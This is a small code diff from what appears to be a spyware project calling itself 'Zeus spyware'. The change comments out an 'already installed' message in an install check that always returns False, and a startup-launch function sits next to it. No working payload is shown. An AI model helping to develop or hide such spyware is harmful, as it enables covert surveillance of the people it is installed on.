@@ -14,7 +14,7 @@ from Handlers.TaskManagmentHandler import TaskManagmentHandler
 configurations = {}
 
 def checkIfExists():
-    print("[i] Zeus spyware is already installed.")
+    # print("[i] Zeus spyware is already installed.")
     return False
 
 def launchFromStartup():
